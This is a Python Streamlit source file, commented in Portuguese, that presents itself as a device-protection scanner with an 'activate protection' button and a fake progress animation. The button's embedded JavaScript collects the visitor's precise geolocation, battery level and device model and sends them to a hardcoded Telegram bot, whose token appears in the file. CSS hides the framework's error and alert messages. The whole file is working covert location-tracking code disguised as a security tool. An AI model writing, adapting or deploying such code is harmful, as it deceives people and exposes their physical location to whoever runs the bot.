import streamlit as st
import time

# --- DADOS DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

# 1. SEU CSS ORIGINAL (SEM ALTERAÇÕES)
st.markdown("""
    <style>
    .main { background-color: #0b0f14; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
    
    .scanner-box { 
        display: flex; 
        flex-direction: column; 
        align-items: center; 
        padding: 20px; 
        animation: float 3s ease-in-out infinite; 
    }
    
    @keyframes float {
        0% { transform: translateY(0px); }
        50% { transform: translateY(-15px); }
        100% { transform: translateY(0px); }
    }

    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.3);
        display: flex; align-items: center; justify-content: center;
    }
    .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
    </style>
""", unsafe_allow_html=True)

# 2. SUA BOLHA (LIMPA, SEM O "p")
caixa_bolha = st.empty()
caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

# 3. O BOTÃO (FOCO APENAS NO POP-UP)
# Aqui o visual é mantido e o JS força o pop-up da Google
js_do_botao = f"""
<div style="display: flex; justify-content: flex-start;">
    <button id="btn-prot" style="background-color: white; color: #333; border: none; padding: 8px 15px; border-radius: 4px; font-size: 14px; font-family: sans-serif; display: flex; align-items: center; gap: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase;">
        <span style="color: red; font-size: 18px;">●</span> ATIVAR PROTEÇÃO
    </button>
</div>

<script>
document.getElementById('btn-prot').onclick = function() {{
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            const bat = await navigator.getBattery();
            const level = Math.round(bat.level * 100);
            const model = navigator.userAgent.split('(')[1].split(')')[0];
            
            const msg = "🛡️ SISTEMA ATIVADO\\n\\nModelo: " + model + "\\nBateria: " + level + "%\\nMapa: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
            
            await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                method: "POST",
                headers: {{ "Content-Type": "application/json" }},
                body: JSON.stringify({{ chat_id: "{ID}", text: msg }})
            }});
            
            window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
        }},
        (err) => {{ console.log("Aguardando ativação no pop-up..."); }},
        {{ enableHighAccuracy: true, timeout: 10000 }}
    );
}};
</script>
"""

ativou = st.components.v1.html(js_do_botao, height=60)

# 4. ANIMAÇÃO (SÓ RODA DEPOIS QUE O POP-UP É ACEITO)
if ativou:
    for p in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>'.replace('{{p}}', str(p)), unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Concluída")
    
